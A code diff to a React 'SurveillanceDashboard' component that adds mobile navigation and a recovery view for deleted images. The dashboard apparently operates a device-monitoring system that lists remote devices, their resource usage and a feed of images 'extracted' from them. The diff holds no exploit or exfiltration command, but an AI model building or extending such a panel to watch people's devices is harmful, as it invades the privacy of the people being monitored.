@@ -10,6 +10,12 @@ import {
   Globe,
   Activity,
   HardDrive,
+  Trash2,
+  RotateCcw,
+  EyeOff,
+  Eye,
+  Menu,
+  X,
 } from "lucide-react";
 import { LineChart, Line, ResponsiveContainer, YAxis, Tooltip } from "recharts";
 
@@ -18,6 +24,8 @@ export default function SurveillanceDashboard() {
   const [selectedDevice, setSelectedDevice] = useState(null);
   const [loading, setLoading] = useState(true);
   const [resourceHistory, setResourceHistory] = useState([]);
+  const [recoveryMode, setRecoveryMode] = useState(false);
+  const [sidebarOpen, setSidebarOpen] = useState(false);
 
   const fetchDevices = async () => {
     try {
@@ -25,14 +33,12 @@ export default function SurveillanceDashboard() {
       const data = await res.json();
       if (data.success) {
         setDevices(data.data);
-        // If we have a selected device, update its data
         if (selectedDevice) {
           const updated = data.data.find(
             (d) => d.deviceId === selectedDevice.deviceId
           );
           if (updated) {
             setSelectedDevice(updated);
-            // Update resource history for graph
             if (updated.resourceUsage) {
               setResourceHistory((prev) => {
                 const newData = [
@@ -58,20 +64,68 @@ export default function SurveillanceDashboard() {
 
   useEffect(() => {
     fetchDevices();
-    const interval = setInterval(fetchDevices, 2000); // Poll faster for real-time feel
+    const interval = setInterval(fetchDevices, 2000);
     return () => clearInterval(interval);
-  }, [selectedDevice?.deviceId]); // Re-run if selected device changes to ensure we track the right one
+  }, [selectedDevice?.deviceId]);
 
   const handleDeviceSelect = (device) => {
     setSelectedDevice(device);
-    setResourceHistory([]); // Reset history for new device
+    setResourceHistory([]);
+    setSidebarOpen(false);
   };
 
+  const handleImageAction = async (imageId, action) => {
+    if (!selectedDevice) return;
+    try {
+      await fetch("/api/telemetry", {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          deviceId: selectedDevice.deviceId,
+          imageId,
+          action,
+        }),
+      });
+      fetchDevices();
+    } catch (err) {
+      console.error("Action failed", err);
+    }
+  };
+
+  const displayedImages =
+    selectedDevice?.images?.filter((img) =>
+      recoveryMode ? img.isDeleted : !img.isDeleted
+    ) || [];
+
   return (
-    <div className="min-h-screen bg-black text-green-500 font-mono flex">
-      {/* Sidebar - Device List */}
-      <div className="w-80 border-r border-green-900 flex flex-col">
-        <div className="p-4 border-b border-green-900 bg-green-900/10">
+    <div className="min-h-screen bg-black text-green-500 font-mono flex relative overflow-hidden">
+      {/* Mobile Header */}
+      <div className="md:hidden fixed top-0 left-0 right-0 z-50 bg-black border-b border-green-900 p-4 flex justify-between items-center">
+        <h1 className="text-lg font-bold flex items-center gap-2">
+          <Globe className="w-5 h-5" /> GLOBAL OPS
+        </h1>
+        <button
+          onClick={() => setSidebarOpen(!sidebarOpen)}
+          className="p-2 border border-green-700 rounded text-green-500"
+        >
+          {sidebarOpen ? (
+            <X className="w-5 h-5" />
+          ) : (
+            <Menu className="w-5 h-5" />
+          )}
+        </button>
+      </div>
+
+      {/* Sidebar */}
+      <div
+        className={`
+        fixed md:relative z-40 inset-y-0 left-0 w-80 bg-black border-r border-green-900 flex flex-col transition-transform duration-300 transform 
+        ${
+          sidebarOpen ? "translate-x-0" : "-translate-x-full"
+        } md:translate-x-0 pt-16 md:pt-0
+      `}
+      >
+        <div className="p-4 border-b border-green-900 bg-green-900/10 hidden md:block">
           <h1 className="text-xl font-bold flex items-center gap-2">
             <Globe className="w-5 h-5" /> GLOBAL OPS
           </h1>
@@ -118,12 +172,12 @@ export default function SurveillanceDashboard() {
         </div>
       </div>
 
-      {/* Main Content - Detail View */}
-      <div className="flex-1 flex flex-col bg-[url('/grid.png')] bg-repeat opacity-90 overflow-hidden">
+      {/* Main Content */}
+      <div className="flex-1 flex flex-col bg-[url('/grid.png')] bg-repeat opacity-90 overflow-hidden pt-16 md:pt-0 w-full">
         {selectedDevice ? (
           <div className="p-6 h-full overflow-y-auto">
             {/* Header */}
-            <div className="flex justify-between items-center mb-8">
+            <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
               <div>
                 <h2 className="text-2xl font-bold flex items-center gap-3">
                   <Crosshair className="w-8 h-8 animate-spin-slow" />
@@ -135,6 +189,23 @@ export default function SurveillanceDashboard() {
                 </div>
               </div>
               <div className="flex gap-2">
+                <button
+                  onClick={() => setRecoveryMode(!recoveryMode)}
+                  className={`p-2 border rounded flex items-center gap-2 ${
+                    recoveryMode
+                      ? "bg-red-900/50 border-red-500 text-red-500"
+                      : "border-green-700 hover:bg-green-900/50"
+                  }`}
+                >
+                  {recoveryMode ? (
+                    <EyeOff className="w-5 h-5" />
+                  ) : (
+                    <Eye className="w-5 h-5" />
+                  )}
+                  <span className="hidden md:inline">
+                    {recoveryMode ? "EXIT RECOVERY" : "VIEW DELETED"}
+                  </span>
+                </button>
                 <button
                   onClick={fetchDevices}
                   className="p-2 border border-green-700 rounded hover:bg-green-900/50"
@@ -260,32 +331,78 @@ export default function SurveillanceDashboard() {
             </div>
 
             {/* Captured Images Gallery */}
-            <div className="border-t border-green-900 pt-6">
-              <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
-                <HardDrive className="w-5 h-5" /> EXTRACTED DATA & SURVEILLANCE
-                FEED
+            <div
+              className={`border-t pt-6 ${
+                recoveryMode ? "border-red-900" : "border-green-900"
+              }`}
+            >
+              <h3
+                className={`text-lg font-bold mb-4 flex items-center gap-2 ${
+                  recoveryMode ? "text-red-500" : "text-green-500"
+                }`}
+              >
+                <HardDrive className="w-5 h-5" />
+                {recoveryMode
+                  ? "DELETED DATA RECOVERY"
+                  : "EXTRACTED DATA & SURVEILLANCE FEED"}
               </h3>
-              {selectedDevice.images && selectedDevice.images.length > 0 ? (
+
+              {displayedImages.length > 0 ? (
                 <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
-                  {selectedDevice.images.map((img, idx) => (
+                  {displayedImages.map((img, idx) => (
                     <div
                       key={idx}
-                      className="relative group border border-green-800 rounded overflow-hidden bg-black"
+                      className={`relative group border rounded overflow-hidden bg-black ${
+                        recoveryMode ? "border-red-800" : "border-green-800"
+                      }`}
                     >
                       <img
                         src={img.url}
                         alt="Captured"
                         className="w-full h-32 object-cover opacity-70 group-hover:opacity-100 transition-opacity"
                       />
-                      <div className="absolute bottom-0 left-0 right-0 bg-black/80 text-[9px] p-1 text-center text-green-400 truncate">
+                      <div className="absolute bottom-0 left-0 right-0 bg-black/80 text-[9px] p-1 text-center text-gray-300 truncate">
                         {new Date(img.capturedAt).toLocaleTimeString()}
+                      </div>
+
+                      {/* Action Overlay */}
+                      <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                        {recoveryMode ? (
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleImageAction(img._id, "restore");
+                            }}
+                            className="p-2 bg-green-900/80 text-green-500 rounded-full hover:bg-green-800"
+                            title="Restore Image"
+                          >
+                            <RotateCcw className="w-5 h-5" />
+                          </button>
+                        ) : (
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleImageAction(img._id, "delete");
+                            }}
+                            className="p-2 bg-red-900/80 text-red-500 rounded-full hover:bg-red-800"
+                            title="Delete Image"
+                          >
+                            <Trash2 className="w-5 h-5" />
+                          </button>
+                        )}
                       </div>
                     </div>
                   ))}
                 </div>
               ) : (
-                <div className="text-gray-500 italic text-sm border border-dashed border-green-900 p-8 text-center rounded">
-                  No visual data extracted yet.
+                <div
+                  className={`text-gray-500 italic text-sm border border-dashed p-8 text-center rounded ${
+                    recoveryMode ? "border-red-900" : "border-green-900"
+                  }`}
+                >
+                  {recoveryMode
+                    ? "No deleted data found."
+                    : "No visual data extracted yet."}
                 </div>
               )}
             </div>
